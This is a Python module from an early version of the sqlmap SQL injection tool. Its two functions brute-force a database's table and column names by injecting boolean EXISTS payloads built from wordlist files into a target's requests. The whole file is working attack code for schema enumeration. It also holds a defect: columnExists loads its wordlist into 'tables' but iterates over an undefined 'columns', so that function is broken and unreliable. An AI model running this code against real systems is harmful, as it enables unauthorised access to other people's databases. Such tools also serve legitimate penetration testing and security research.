#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import time

from lib.core.agent import agent
from lib.core.common import dataToStdout
from lib.core.common import getConsoleWidth
from lib.core.common import getFileItems
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import safeStringFormat
from lib.core.data import conf
from lib.core.data import logger
from lib.request.connect import Connect as Request

def tableExists(tableFile):
    tables = getFileItems(tableFile, None)
    retVal = []
    infoMsg = "checking tables existence using items from '%s'" % tableFile
    logger.info(infoMsg)

    pushValue(conf.verbose)
    conf.verbose = 0
    count = 0
    length = len(tables)

    for table in tables:
        query = agent.prefixQuery("%s" % safeStringFormat("AND EXISTS(SELECT %d FROM %s)", (randomInt(1), table)))
        query = agent.postfixQuery(query)
        result = Request.queryPage(agent.payload(newValue=query))

        if result:
            infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), table)
            infoMsg = "%s%s\n" % (infoMsg, " "*(getConsoleWidth()-1-len(infoMsg)))
            dataToStdout(infoMsg, True)
            retVal.append(table)

        count += 1
        status = '%d/%d items (%d%s)' % (count, length, round(100.0*count/length), '%')
        dataToStdout("\r[%s] [INFO] tried: %s" % (time.strftime("%X"), status), True)

    conf.verbose = popValue()

    dataToStdout("\n", True)

    if not retVal:
        warnMsg = "no table found"
        logger.warn(warnMsg)

    return retVal

def columnExists(table, columnFile):
    tables = getFileItems(columnFile, None)
    retVal = []
    infoMsg = "checking column existence for table '%s' using items from '%s'" % (table, columnFile)
    logger.info(infoMsg)

    pushValue(conf.verbose)
    conf.verbose = 0
    count = 0
    length = len(tables)

    for column in columns:
        query = agent.prefixQuery("%s" % safeStringFormat("AND EXISTS(SELECT %s FROM %s)", (column, table)))
        query = agent.postfixQuery(query)
        result = Request.queryPage(agent.payload(newValue=query))

        if result:
            infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), column)
            infoMsg = "%s%s\n" % (infoMsg, " "*(getConsoleWidth()-1-len(infoMsg)))
            dataToStdout(infoMsg, True)
            retVal.append(column)

        count += 1
        status = '%d/%d items (%d%s)' % (count, length, round(100.0*count/length), '%')
        dataToStdout("\r[%s] [INFO] tried: %s" % (time.strftime("%X"), status), True)

    conf.verbose = popValue()

    dataToStdout("\n", True)

    if not retVal:
        warnMsg = "no column found"
        logger.warn(warnMsg)

    return retVal
